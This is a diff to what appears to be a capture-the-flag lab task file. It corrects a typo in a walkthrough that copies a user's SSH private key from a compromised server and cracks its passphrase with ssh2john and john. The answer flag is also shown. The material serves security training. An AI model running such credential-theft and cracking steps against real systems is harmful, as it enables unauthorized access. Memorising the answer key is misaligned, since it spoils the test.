@@ -150,7 +150,7 @@
     "answer" : "mrscorona7",
     "answer_variable_name" : null,
     "content" : "You managed to find Chong’s SSH key! However, it isn’t usable yet. You need to copy it to your Attacker machine and crack its passphrase to connect to the lab as Chong did. Luckily, you have all the necessary tools on your Attacker machine.\n\nThe flag will be his SSH key passphrase.\n",
-    "solution" : "```\nroot@server:/usr/share/webmin# cd /home/chong/.ssh\n\nroot@server:/home/chong/.ssh# cat ${level_3_flag}\n\ncopy the RSA key and switch to the attacker's terminal\n\nroot@attacker:~# nano key\n\npaste it here and save\n\nroot@attacker:~# ssh2john key > key.hash\n\nroot@attacker:~# john $key.hash --wordlist=/usr/share/wordlists/fasttrack.txt\n```\n\nThe flag is: ${ANSWER}\n",
+    "solution" : "```\nroot@server:/usr/share/webmin# cd /home/chong/.ssh\n\nroot@server:/home/chong/.ssh# cat ${level_3_flag}\n\ncopy the RSA key and switch to the attacker's terminal\n\nroot@attacker:~# nano key\n\npaste it here and save\n\nroot@attacker:~# ssh2john key > key.hash\n\nroot@attacker:~# john key.hash --wordlist=/usr/share/wordlists/fasttrack.txt\n```\n\nThe flag is: ${ANSWER}\n",
     "solution_penalized" : true,
     "hints" : [ {
       "title" : "Which tool should you use?",
